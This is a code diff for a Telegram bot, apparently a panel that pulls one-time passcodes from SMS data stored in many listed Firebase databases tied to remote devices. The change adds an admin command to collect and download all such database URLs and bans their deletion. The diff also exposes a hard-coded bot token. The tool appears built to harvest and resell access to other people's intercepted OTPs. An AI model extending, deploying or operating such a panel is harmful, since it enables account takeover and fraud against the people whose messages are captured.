@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 """
-OTP PANEL BOT — SUPREME MASTER EDITION v3.6 PREMIUM
-Crash-Proof Callbacks · Private OTP (unlimited, no-delete)
-Bulk Firebase Import · firebase.txt Logging · /recent command
+OTP PANEL BOT — SUPREME MASTER EDITION v3.7
+· No-delete policy (Firebase URLs cannot be deleted by anyone)
+· /activeurls — view + download all active Firebase URLs
+· Private OTP · Bulk Firebase Import · firebase.txt logging
 """
 
 import os
@@ -11,11 +12,12 @@ import time
 import json
 import asyncio
 import logging
+from io import BytesIO
 from collections import deque
 from datetime import datetime
 from typing import Optional
 import aiohttp
-from aiohttp import web  # Render web service ke liye add kiya gaya
+from aiohttp import web
 from telegram import (
     Update, InlineKeyboardButton, InlineKeyboardMarkup,
     ReplyKeyboardMarkup, KeyboardButton, BotCommand,
@@ -105,7 +107,7 @@ DATABASES = {
     "Priysnshuu": "https://priysnshuu-default-rtdb.firebaseio.com",
     "Haab": "https://haab-b3370-default-rtdb.firebaseio.com",
     "Ueuwuw": "https://ueuwuw-default-rtdb.firebaseio.com",
-    "Test": "https://test-firebaseio.com",
+    "Test": "https://test.firebaseio.com",
     "Jkhsadfhjk": "https://jkhsadfhjk-default-rtdb.firebaseio.com",
     "Sonic": "https://sonic-d5c1a-default-rtdb.firebaseio.com",
     "Jonisins": "https://jonisins-52271-default-rtdb.firebaseio.com",
@@ -138,15 +140,15 @@ TOKEN = os.environ.get("BOT_TOKEN", "8627230535:AAHxgtfWW0MDUKuE73xUPyNq9E0OjTbi
 BOT_USERNAME = "firebaseioOtp_bot"
 DB_FILE = "bot_database.json"
 
-ADMIN_IDS: set[int] = {7178096331,1429768597,8900748530} 
+ADMIN_IDS: set[int] = {7178096331, 1429768597, 8900748530}
 
 REQUIRED_CHANNELS = [
     {"username": "earnflowspidy", "url": "https://t.me/earnflowspidy", "name": "Raji Expilot"},
 ]
 
 FIREBASE_LOG_FILE = "firebase.txt"
-MAX_PRIVATE_DBS_PER_USER = 999999          # ← UNLIMITED
-MAX_PRIVATE_DBS_TOTAL = 999999             # ← effectively unlimited
+MAX_PRIVATE_DBS_PER_USER = 999999
+MAX_PRIVATE_DBS_TOTAL = 999999
 PRIVATE_REFRESH_BATCH = 12
 VIP_PRICE_COINS = 20
 VIP_DURATION_HOURS = 10
@@ -285,7 +287,7 @@ async def get_http_session() -> aiohttp.ClientSession:
         timeout = aiohttp.ClientTimeout(total=8, connect=5, sock_connect=5, sock_read=8)
         _http_session = aiohttp.ClientSession(
             connector=connector, timeout=timeout,
-            headers={"User-Agent": "OTPPanelBot/3.6"},
+            headers={"User-Agent": "OTPPanelBot/3.7"},
         )
     return _http_session
 
@@ -509,8 +511,7 @@ def auto_db_name(url: str, reserved: Optional[set] = None) -> str:
         name = f"{base}{i}"
         i += 1
     return name
-
-# ════════════════════════════════════════════════════════════
+    # ════════════════════════════════════════════════════════════
 #  firebase.txt LOGGING + PRIVATE DB HELPERS
 # ════════════════════════════════════════════════════════════
 
@@ -594,6 +595,97 @@ async def bulk_add_databases(urls: list[str], user_id: int = 0,
         log_firebase_url(url, user_id, source=source)
         added.append((name, len(devs)))
     return added, failed
+
+# ════════════════════════════════════════════════════════════
+#  ACTIVE URLS COLLECTOR  (new — no-delete + downloadable)
+# ════════════════════════════════════════════════════════════
+
+def collect_active_urls() -> list[dict]:
+    """Collect every active Firebase URL across all pools.
+
+    Returns list of dicts with:
+        name, url, source, devices, online
+    Sources:
+        · public  — global DATABASES pool
+        · private — every user's PRIVATE_DBS (deduped)
+        · clone   — legacy per-clone custom_db (if set)
+    """
+    seen_urls: set[str] = set()
+    rows: list[dict] = []
+
+    # 1) Global public pool
+    for name, url in DATABASES.items():
+        if url in seen_urls:
+            continue
+        seen_urls.add(url)
+        devs = GLOBAL_DEVICE_CACHE.get(name, [])
+        online = sum(1 for d in devs if d.status == "online")
+        rows.append({
+            "name": name,
+            "url": url,
+            "source": "public",
+            "devices": len(devs),
+            "online": online,
+        })
+
+    # 2) Private DBs (deduped across users)
+    for uid, lst in PRIVATE_DBS.items():
+        for pdb in lst:
+            url = pdb.get("url", "").rstrip("/")
+            if not url or url in seen_urls:
+                continue
+            seen_urls.add(url)
+            devs = PRIVATE_DEVICE_CACHE.get(url, [])
+            online = sum(1 for d in devs if d.status == "online")
+            rows.append({
+                "name": pdb.get("name", "Private"),
+                "url": url,
+                "source": "private",
+                "devices": len(devs),
+                "online": online,
+            })
+
+    # 3) Legacy clone custom_db
+    for token, data in CLONES.items():
+        cdb = data.get("custom_db")
+        if not cdb:
+            continue
+        cdb = cdb.rstrip("/")
+        if cdb in seen_urls:
+            continue
+        seen_urls.add(cdb)
+        devs = GLOBAL_DEVICE_CACHE.get(f"C_{token[:6]}", [])
+        online = sum(1 for d in devs if d.status == "online")
+        rows.append({
+            "name": f"clone:{data.get('username','?')}",
+            "url": cdb,
+            "source": "clone",
+            "devices": len(devs),
+            "online": online,
+        })
+
+    return rows
+
+
+def build_active_urls_txt() -> bytes:
+    """Build the .txt payload for /activeurls download."""
+    rows = collect_active_urls()
+    ts = datetime.now().strftime("%d %b %Y %I:%M %p")
+    lines = [
+        f"# Active Firebase URLs — {ts}",
+        f"# Total unique URLs: {len(rows)}",
+        "",
+    ]
+    for i, r in enumerate(rows, 1):
+        lines.append(f"{i}. {r['url']}")
+    lines.append("")
+    lines.append("# ── Details ──────────────────────────────────")
+    for i, r in enumerate(rows, 1):
+        lines.append(
+            f"{i}. [{r['source']}] {r['name']} | "
+            f"{r['devices']} devices | {r['online']} online"
+        )
+    return ("\n".join(lines)).encode("utf-8")
 
 # ════════════════════════════════════════════════════════════
 #  DEVICE CLASS
@@ -763,6 +855,7 @@ async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
     entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
     entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
     return entries[:limit]
+
 # ════════════════════════════════════════════════════════════
 #  COMMAND MENU
 # ════════════════════════════════════════════════════════════
@@ -780,6 +873,7 @@ async def register_commands(app: Application):
         BotCommand("status",      "📊 Live status (admin only)"),
         BotCommand("help",        "🛡 Admin commands (admin only)"),
         BotCommand("stats",       "📊 Bot statistics (admin only)"),
+        BotCommand("activeurls",  "🌐 All active Firebase URLs (admin only)"),
     ]
     try:
         await app.bot.set_my_commands(commands)
@@ -803,6 +897,7 @@ def build_handlers(application: Application) -> None:
     application.add_handler(CommandHandler("status", cmd_bot_status))
     application.add_handler(CommandHandler("leaderboard", cmd_leaderboard))
     application.add_handler(CommandHandler("support", cmd_support))
+    application.add_handler(CommandHandler("activeurls", cmd_activeurls))
     application.add_handler(CallbackQueryHandler(on_callback))
     application.add_handler(MessageHandler(filters.COMMAND, on_command))
     application.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, on_document))
@@ -841,15 +936,10 @@ async def stop_clone_app(clone_app) -> None:
         tlog(f"Clone shutdown warning: {e}")
 
 # ════════════════════════════════════════════════════════════
-#  UI BUILDERS  (v3.6 clean layout)
+#  UI BUILDERS  (v3.7 — no-delete admin)
 # ════════════════════════════════════════════════════════════
 
 def get_reply_menu(is_admin: bool, bot_token: str, chat_id: int = 0) -> ReplyKeyboardMarkup:
-    """Clean premium keyboard — 2 per row.
-    · No My Profile button
-    · No Recent OTP button (use /recent)
-    · No Buy VIP button (VIP purchase happens inside Devices List VIP-lock)
-    """
     keys = [
         [KeyboardButton("📱 Devices List"), KeyboardButton("🔍 Search Number")],
         [KeyboardButton("🔐 Private OTP"),  KeyboardButton("💸 Refer & Earn")],
@@ -1018,19 +1108,24 @@ def admin_panel_text(bot_token: str) -> str:
             f"⏳ Unverified     : <b>{unverified}</b>\n📡 Active Chats   : <b>{active_chats}</b>\n"
             f"🏆 Total OTP Views: <b>{total_otps}</b>\n")
     if bot_token == TOKEN:
+        active_urls = len(collect_active_urls())
         text += (f"🤖 Cloned Bots    : <b>{len(CLONES)}</b>\n"
                  f"🗄 Databases       : <b>{len(DATABASES)}</b>\n"
-                 f"🔐 Private DBs     : <b>{total_private_dbs()}</b>\n")
+                 f"🔐 Private DBs     : <b>{total_private_dbs()}</b>\n"
+                 f"🌐 Active URLs     : <b>{active_urls}</b>\n")
     text += f"━━━━━━━━━━━━━━━━━━\n🕐 Updated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
     return text
 
 
 def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
+    """v3.7 — NO delete buttons. Admin can VIEW + ADD + DOWNLOAD active URLs."""
     keys = [
         [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
          InlineKeyboardButton("👥 User List", callback_data="admin_users")],
         [InlineKeyboardButton("🎁 Gift Coins to All", callback_data="admin_gift_coins")],
         [InlineKeyboardButton("➕ Add Firebase URL(s)", callback_data="admin_add_firebase")],
+        [InlineKeyboardButton("🌐 Active URLs / Download",
+                              callback_data="admin_active_urls")],
     ]
     if bot_token != TOKEN:
         keys.append([InlineKeyboardButton("🔗 Add Custom Firebase URL", callback_data="add_custom_db")])
@@ -1040,7 +1135,7 @@ def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
 
 
 async def _private_dbs_view(chat_id: int) -> tuple[str, InlineKeyboardMarkup]:
-    """Private OTP view — unlimited DBs, NO delete button (users can't remove)."""
+    """Private OTP view — unlimited DBs, NO delete button."""
     dbs = PRIVATE_DBS.get(chat_id, [])
     lines = [
         "🔐 <b>PRIVATE OTP DATABASES</b>",
@@ -1058,7 +1153,7 @@ async def _private_dbs_view(chat_id: int) -> tuple[str, InlineKeyboardMarkup]:
             lines.append(f"     ⏱ {pdb['added_at']}")
     lines.append("")
     lines.append(f"📊 Total private DBs: <b>{len(dbs)}</b>  ♾️ <i>unlimited</i>")
-    lines.append("🔒 <i>Private DBs cannot be deleted by users.</i>")
+    lines.append("🔒 <i>Private DBs cannot be deleted by anyone.</i>")
 
     rows = []
     for i, pdb in enumerate(dbs):
@@ -1173,10 +1268,9 @@ async def auto_save_loop():
             await save_data_async()
             raise
         except Exception as e:
-            tlog(f"Auto-save loop recovered: {e}")
-
+            tlog(f"Auto-save loop recovered: {e}") 
 # ════════════════════════════════════════════════════════════
-#  HANDLERS — START / PERSIST / CONTEXT
+#  HANDLERS — START / CONTEXT / BASIC CMDS
 # ════════════════════════════════════════════════════════════
 
 async def send_bonus_if_applicable(ctx, chat_id: int, users_db: dict, is_main_bot: bool):
@@ -1270,7 +1364,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     except TelegramError as e:
         tlog(f"Welcome send failed: {e}")
 
-# ─── /recent SLASH COMMAND (moved from old keyboard button) ──
+# ─── /recent ────────────────────────────────────────────────
 
 async def cmd_recent(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id = update.effective_chat.id
@@ -1373,7 +1467,7 @@ async def cmd_recent(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     except TelegramError:
         pass
 
-# ─── OTHER SIMPLE COMMANDS ───────────────────────────────────
+# ─── /points /referral /cancel /help /stats ─────────────────
 
 async def cmd_points(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id = update.effective_chat.id
@@ -1454,14 +1548,79 @@ async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     except TelegramError as e:
         tlog(f"/admin send failed: {e}")
 
+# ─── /activeurls (NEW) ──────────────────────────────────────
+
+async def cmd_activeurls(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin-only: show every active Firebase URL + let admin download as .txt."""
+    chat_id = update.effective_chat.id
+    bot_token, is_main_bot, _, is_admin, _ = _bot_context(ctx, chat_id)
+    if not is_admin:
+        try:
+            await update.message.reply_text("🚫 Admin only.")
+        except TelegramError:
+            pass
+        return
+
+    # Public + private + clone URLs — full snapshot
+    rows = collect_active_urls()
+    if not rows:
+        try:
+            await update.message.reply_text("📭 No active URLs found anywhere.")
+        except TelegramError:
+            pass
+        return
+
+    total_devs = sum(r["devices"] for r in rows)
+    total_online = sum(r["online"] for r in rows)
+
+    lines = [
+        "🌐 <b>ALL ACTIVE FIREBASE URLs</b>",
+        "━━━━━━━━━━━━━━━━━━",
+        f"📊 Unique URLs   : <b>{len(rows)}</b>",
+        f"📱 Total devices : <b>{total_devs}</b>",
+        f"🟢 Total online  : <b>{total_online}</b>",
+        "",
+        "<b>List:</b>",
+    ]
+    for i, r in enumerate(rows[:40], 1):
+        icon = "🟢" if r["online"] > 0 else "🔴"
+        lines.append(
+            f"<b>{i}.</b> {icon} <code>{r['url']}</code>\n"
+            f"     [{r['source']}] {r['name']} — "
+            f"{r['devices']} dev · {r['online']} on"
+        )
+    if len(rows) > 40:
+        lines.append(f"\n…+{len(rows) - 40} more (in the .txt file)")
+    lines.append("")
+    lines.append("📥 Niche button dabayein — poora .txt download karne ke liye.")
+
+    text = "\n".join(lines)
+    if len(text) > 4000:
+        text = text[:4000] + "\n…"
+
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("📥 Download .txt", callback_data="activeurls_download")],
+        [InlineKeyboardButton("🔄 Refresh", callback_data="activeurls_refresh"),
+         InlineKeyboardButton("❌ Close", callback_data="close_msg")],
+    ])
+    try:
+        await update.message.reply_text(text, parse_mode="HTML",
+                                        reply_markup=kb,
+                                        disable_web_page_preview=True)
+    except TelegramError as e:
+        tlog(f"/activeurls send failed: {e}")
+
+# ─── /status /leaderboard /support ──────────────────────────
 
 async def _status_payload(bot_token: str) -> str:
     devices = await get_all_devices(bot_token)
     online = sum(1 for d in devices if d.status == "online")
     db_counts = {tag: sum(1 for d in devices if d.db_tag == tag) for tag in set(d.db_tag for d in devices)}
-    db_lines = "\n".join([f"🗄 DB {tag}: {count} devices" for tag, count in db_counts.items()])
+    db_lines = "\n".join([f"🗄 DB {tag}: {count} devices" for tag, count in list(db_counts.items())[:20]])
+    active_urls = len(collect_active_urls())
     return (f"📊 <b>BOT STATUS</b>\n━━━━━━━━━━━━━━━━━━\n🤖 Bot Engine: Running ✅\n{db_lines}\n\n"
             f"📱 Total Linked: <b>{len(devices)}</b>\n🟢 Online: <b>{online}</b>  |  🔴 Offline: <b>{len(devices) - online}</b>\n"
+            f"🌐 Active URLs: <b>{active_urls}</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n🕐 {datetime.now().strftime('%d %b %Y %I:%M %p')}")
 
 
@@ -1684,6 +1843,69 @@ async def _dispatch_callback(query, ctx, data: str, chat_id: int, bot_token: str
                             [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
         return
 
+    # ── ACTIVE URLS (download + refresh) ───────────────────
+    if data == "activeurls_download" and is_admin:
+        rows = collect_active_urls()
+        if not rows:
+            await safe_answer(query, "No active URLs.", show_alert=True)
+            return
+        payload = build_active_urls_txt()
+        try:
+            await ctx.bot.send_document(
+                chat_id=chat_id,
+                document=BytesIO(payload),
+                filename=f"active_urls_{datetime.now().strftime('%Y%m%d_%H%M')}.txt",
+                caption=f"🌐 <b>Active Firebase URLs</b>\n"
+                        f"📊 Total: <b>{len(rows)}</b> unique URLs\n"
+                        f"🕐 {datetime.now().strftime('%d %b %Y %I:%M %p')}",
+                parse_mode="HTML",
+            )
+            await safe_answer(query, "📥 Sent!", show_alert=False)
+        except Exception as e:
+            tlog(f"activeurls_download failed: {e}")
+            await safe_answer(query, f"❌ Failed: {str(e)[:100]}", show_alert=True)
+        return
+
+    if data == "activeurls_refresh" and is_admin:
+        rows = collect_active_urls()
+        if not rows:
+            await safe_edit(query, "📭 No active URLs found anywhere.",
+                            reply_markup=InlineKeyboardMarkup([
+                                [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
+            return
+        total_devs = sum(r["devices"] for r in rows)
+        total_online = sum(r["online"] for r in rows)
+        lines = [
+            "🌐 <b>ALL ACTIVE FIREBASE URLs</b>",
+            "━━━━━━━━━━━━━━━━━━",
+            f"📊 Unique URLs   : <b>{len(rows)}</b>",
+            f"📱 Total devices : <b>{total_devs}</b>",
+            f"🟢 Total online  : <b>{total_online}</b>",
+            "",
+            "<b>List:</b>",
+        ]
+        for i, r in enumerate(rows[:40], 1):
+            icon = "🟢" if r["online"] > 0 else "🔴"
+            lines.append(
+                f"<b>{i}.</b> {icon} <code>{r['url']}</code>\n"
+                f"     [{r['source']}] {r['name']} — "
+                f"{r['devices']} dev · {r['online']} on"
+            )
+        if len(rows) > 40:
+            lines.append(f"\n…+{len(rows) - 40} more (in the .txt file)")
+        lines.append("")
+        lines.append("📥 Niche button dabayein — poora .txt download karne ke liye.")
+        text = "\n".join(lines)
+        if len(text) > 4000:
+            text = text[:4000] + "\n…"
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📥 Download .txt", callback_data="activeurls_download")],
+            [InlineKeyboardButton("🔄 Refresh", callback_data="activeurls_refresh"),
+             InlineKeyboardButton("❌ Close", callback_data="close_msg")],
+        ])
+        await safe_edit(query, text, reply_markup=kb, disable_web_page_preview=True)
+        return
+
     if data == "check_join":
         if is_main_bot:
             not_joined = await check_membership(bot_token, ctx.bot, chat_id)
@@ -1719,7 +1941,7 @@ async def _dispatch_callback(query, ctx, data: str, chat_id: int, bot_token: str
         await safe_edit(query, await _status_payload(bot_token), reply_markup=_status_keyboard())
         return
 
-    # ── PRIVATE OTP CALLBACKS (no delete button) ───────────
+    # ── PRIVATE OTP CALLBACKS ──────────────────────────────
     if data == "priv_refresh":
         user_focus.setdefault(bot_token, {}).pop(chat_id, None)
         text, kb = await _private_dbs_view(chat_id)
@@ -1773,9 +1995,50 @@ async def _dispatch_callback(query, ctx, data: str, chat_id: int, bot_token: str
         return
     # NOTE: No priv_del handler — users cannot delete private DBs
 
+    # ── ADMIN PANEL CALLBACKS ──────────────────────────────
     if data == "admin_refresh" and is_admin:
         user_focus.setdefault(bot_token, {}).pop(chat_id, None)
         await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token))
+        return
+
+    if data == "admin_active_urls" and is_admin:
+        rows = collect_active_urls()
+        if not rows:
+            await safe_edit(query, "📭 No active URLs found anywhere.",
+                            reply_markup=InlineKeyboardMarkup([
+                                [InlineKeyboardButton("🔙 Back", callback_data="admin_refresh")]]))
+            return
+        total_devs = sum(r["devices"] for r in rows)
+        total_online = sum(r["online"] for r in rows)
+        lines = [
+            "🌐 <b>ALL ACTIVE FIREBASE URLs</b>",
+            "━━━━━━━━━━━━━━━━━━",
+            f"📊 Unique URLs   : <b>{len(rows)}</b>",
+            f"📱 Total devices : <b>{total_devs}</b>",
+            f"🟢 Total online  : <b>{total_online}</b>",
+            "",
+            "<b>List:</b>",
+        ]
+        for i, r in enumerate(rows[:40], 1):
+            icon = "🟢" if r["online"] > 0 else "🔴"
+            lines.append(
+                f"<b>{i}.</b> {icon} <code>{r['url']}</code>\n"
+                f"     [{r['source']}] {r['name']} — "
+                f"{r['devices']} dev · {r['online']} on"
+            )
+        if len(rows) > 40:
+            lines.append(f"\n…+{len(rows) - 40} more (in the .txt file)")
+        lines.append("")
+        lines.append("📥 Niche button dabayein — poora .txt download karne ke liye.")
+        text = "\n".join(lines)
+        if len(text) > 4000:
+            text = text[:4000] + "\n…"
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📥 Download .txt", callback_data="activeurls_download")],
+            [InlineKeyboardButton("🔄 Refresh", callback_data="admin_active_urls"),
+             InlineKeyboardButton("🔙 Back", callback_data="admin_refresh")],
+        ])
+        await safe_edit(query, text, reply_markup=kb, disable_web_page_preview=True)
         return
 
     if data == "admin_add_firebase" and is_admin and is_main_bot:
@@ -1826,6 +2089,7 @@ async def _dispatch_callback(query, ctx, data: str, chat_id: int, bot_token: str
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_refresh")]]))
         return
 
+    # ── DEVICE LIST CALLBACKS ──────────────────────────────
     if data == "home":
         user_focus.setdefault(bot_token, {}).pop(chat_id, None)
         pending_action.pop(chat_id, None)
@@ -1955,7 +2219,7 @@ async def _dispatch_callback(query, ctx, data: str, chat_id: int, bot_token: str
         await safe_edit(query, text, reply_markup=kb)
         return
 # ════════════════════════════════════════════════════════════
-#  ADMIN COMMAND HANDLER
+#  ADMIN COMMAND HANDLER  (v3.7 — NO /deldb, NO delete option)
 # ════════════════════════════════════════════════════════════
 
 async def _get_send_bot(is_main_bot: bool, bot_token: str, fallback_bot):
@@ -1980,12 +2244,14 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         except TelegramError as e:
             tlog(f"Admin reply failed: {e}")
 
+    # ── /help ──────────────────────────────────────────────
     if cmd == "/help":
         help_text = (
             "🛡 <b>ADMIN COMMANDS</b>\n━━━━━━━━━━━━━━━━━━\n"
             "<b>🖥 Panels</b>\n"
             "• <code>/admin</code> — Open admin panel\n"
             "• <code>/status</code> — Live engine status\n"
+            "• <code>/activeurls</code> — View + download all active Firebase URLs\n"
             "• <code>/leaderboard</code> — Top users board\n"
             "• <code>/support</code> — Support links\n\n"
             "<b>💰 Coin Management</b>\n"
@@ -2015,14 +2281,59 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
             "• <code>/listdb</code> — List all databases\n"
             "• <code>/count</code> — Count devices across DBs\n"
             "• <code>/viewdb</code> — Download firebase.txt\n"
-            "• <code>/deldb URL</code> — Delete any DB (public + private)\n\n"
+            "• <code>/activeurls</code> — All active URLs + download .txt\n\n"
             "<b>🤖 Clone Bot Management</b>\n"
             "• <code>/clones</code> — List all active clone bots\n"
-            "• <code>/kill TOKEN</code> — Stop a clone bot\n"
+            "• <code>/kill TOKEN</code> — Stop a clone bot\n\n"
+            "🔒 <i>Note: Firebase URLs cannot be deleted. This is a permanent policy.</i>"
         )
         await reply(help_text, parse_mode="HTML")
         return True
 
+    # ── /activeurls — main shortcut, delegates to cmd_activeurls logic ──
+    if cmd == "/activeurls":
+        rows = collect_active_urls()
+        if not rows:
+            await reply("📭 No active URLs found anywhere.")
+            return True
+        total_devs = sum(r["devices"] for r in rows)
+        total_online = sum(r["online"] for r in rows)
+        lines = [
+            "🌐 <b>ALL ACTIVE FIREBASE URLs</b>",
+            "━━━━━━━━━━━━━━━━━━",
+            f"📊 Unique URLs   : <b>{len(rows)}</b>",
+            f"📱 Total devices : <b>{total_devs}</b>",
+            f"🟢 Total online  : <b>{total_online}</b>",
+            "",
+            "<b>List:</b>",
+        ]
+        for i, r in enumerate(rows[:40], 1):
+            icon = "🟢" if r["online"] > 0 else "🔴"
+            lines.append(
+                f"<b>{i}.</b> {icon} <code>{r['url']}</code>\n"
+                f"     [{r['source']}] {r['name']} — "
+                f"{r['devices']} dev · {r['online']} on"
+            )
+        if len(rows) > 40:
+            lines.append(f"\n…+{len(rows) - 40} more (in the .txt file)")
+        lines.append("")
+        lines.append("📥 Niche button dabayein — poora .txt download karne ke liye.")
+        text_out = "\n".join(lines)
+        if len(text_out) > 4000:
+            text_out = text_out[:4000] + "\n…"
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📥 Download .txt", callback_data="activeurls_download")],
+            [InlineKeyboardButton("🔄 Refresh", callback_data="activeurls_refresh")],
+        ])
+        try:
+            await update.message.reply_text(text_out, parse_mode="HTML",
+                                            reply_markup=kb,
+                                            disable_web_page_preview=True)
+        except TelegramError as e:
+            tlog(f"/activeurls send failed: {e}")
+        return True
+
+    # ── /all N ─────────────────────────────────────────────
     if cmd == "/all":
         if not args or not args[0].isdigit():
             await reply("⚠️ Usage: <code>/all 50</code>", parse_mode="HTML")
@@ -2055,6 +2366,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
             parse_mode="HTML")
         return True
 
+    # ── /give USER_ID N ────────────────────────────────────
     if cmd == "/give":
         if len(args) < 2 or not args[0].lstrip("-").isdigit() or not args[1].isdigit():
             await reply("⚠️ Usage: <code>/give USER_ID AMOUNT</code>", parse_mode="HTML")
@@ -2082,6 +2394,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
             parse_mode="HTML")
         return True
 
+    # ── /take USER_ID N ────────────────────────────────────
     if cmd == "/take":
         if len(args) < 2 or not args[0].lstrip("-").isdigit() or not args[1].isdigit():
             await reply("⚠️ Usage: <code>/take USER_ID AMOUNT</code>", parse_mode="HTML")
@@ -2095,6 +2408,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         await reply(f"✅ <code>{uid}</code>: {old} → {users_db[uid]['coins']}", parse_mode="HTML")
         return True
 
+    # ── /reset USER_ID ─────────────────────────────────────
     if cmd == "/reset":
         if not args or not args[0].lstrip("-").isdigit():
             await reply("⚠️ Usage: <code>/reset USER_ID</code>", parse_mode="HTML")
@@ -2108,6 +2422,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         await reply(f"✅ Reset: {old} → 0", parse_mode="HTML")
         return True
 
+    # ── /resetall ──────────────────────────────────────────
     if cmd == "/resetall":
         count = 0
         for uid in users_db:
@@ -2117,6 +2432,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         await reply(f"✅ <b>ALL RESET</b>\n👥 {count} affected.", parse_mode="HTML")
         return True
 
+    # ── /setcoin USER_ID N ─────────────────────────────────
     if cmd == "/setcoin":
         if len(args) < 2 or not args[0].lstrip("-").isdigit() or not args[1].isdigit():
             await reply("⚠️ Usage: <code>/setcoin USER_ID VALUE</code>", parse_mode="HTML")
@@ -2130,6 +2446,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         await reply(f"✅ <code>{uid}</code>: {old} → {val}", parse_mode="HTML")
         return True
 
+    # ── /vip USER_ID HOURS ─────────────────────────────────
     if cmd == "/vip":
         if len(args) < 2 or not args[0].lstrip("-").isdigit() or not args[1].isdigit():
             await reply("⚠️ Usage: <code>/vip USER_ID HOURS</code>", parse_mode="HTML")
@@ -2153,6 +2470,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         await reply(f"✅ VIP {hours}h to <code>{uid}</code>", parse_mode="HTML")
         return True
 
+    # ── /unvip USER_ID ─────────────────────────────────────
     if cmd == "/unvip":
         if not args or not args[0].lstrip("-").isdigit():
             await reply("⚠️ Usage: <code>/unvip USER_ID</code>", parse_mode="HTML")
@@ -2165,6 +2483,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         await reply(f"✅ VIP removed from <code>{uid}</code>", parse_mode="HTML")
         return True
 
+    # ── /vipall HOURS ──────────────────────────────────────
     if cmd == "/vipall":
         if not args or not args[0].isdigit():
             await reply("⚠️ Usage: <code>/vipall HOURS</code>", parse_mode="HTML")
@@ -2193,6 +2512,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         await wait.edit_text(f"✅ VIP sent to {sent}/{len(users_db)}.", parse_mode="HTML")
         return True
 
+    # ── /vipinfo USER_ID ───────────────────────────────────
     if cmd == "/vipinfo":
         if not args or not args[0].lstrip("-").isdigit():
             await reply("⚠️ Usage: <code>/vipinfo USER_ID</code>", parse_mode="HTML")
@@ -2209,6 +2529,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
             parse_mode="HTML")
         return True
 
+    # ── /ban USER_ID ───────────────────────────────────────
     if cmd == "/ban":
         if not args or not args[0].lstrip("-").isdigit():
             await reply("⚠️ Usage: <code>/ban USER_ID</code>", parse_mode="HTML")
@@ -2222,6 +2543,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         await reply(f"✅ Banned <code>{uid}</code>.", parse_mode="HTML")
         return True
 
+    # ── /unban USER_ID ─────────────────────────────────────
     if cmd == "/unban":
         if not args or not args[0].lstrip("-").isdigit():
             await reply("⚠️ Usage: <code>/unban USER_ID</code>", parse_mode="HTML")
@@ -2234,6 +2556,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
         await reply(f"✅ Unbanned <code>{uid}</code>.", parse_mode="HTML")
         return True
 
+    # ── /userinfo USER_ID ──────────────────────────────────
     if cmd == "/userinfo":
         if not args or not args[0].lstrip("-").isdigit():
             await reply("⚠️ Usage: <code>/userinfo USER_ID</code>", parse_mode="HTML")
@@ -2256,6 +2579,7 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
             parse_mode="HTML")
         return True
 
+    # ── /stats ─────────────────────────────────────────────
     if cmd == "/stats":
         total_users = len(users_db)
         verified = sum(1 for u in users_db.values() if u.get("verified"))
@@ -2272,15 +2596,18 @@ async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
             f"📩 OTPs: {total_otps}\n👥 Referrals: {total_refs}\n"
             f"📱 Devices: {total_devices}\n🗄 DBs: {len(DATABASES)}\n"
             f"🔐 Private DBs: {total_private_dbs()}\n"
+            f"🌐 Active URLs: {len(collect_active_urls())}\n"
             f"🤖 Clones: {len(CLONES)}\n━━━━━━━━━━━━━━━━━━\n"
             f"🕐 {datetime.now().strftime('%d %b %Y %I:%M %p')}",
             parse_mode="HTML")
         return True
 
+    # ── /top ───────────────────────────────────────────────
     if cmd == "/top":
         await reply(_leaderboard_text(users_db), parse_mode="HTML")
         return True
 
+    # ── /broadcast MSG ─────────────────────────────────────
     if cmd == "/broadcast":
         if not args:
             await reply("⚠️ Usage: <code>/broadcast Your message</code>", parse_mode="HTML")
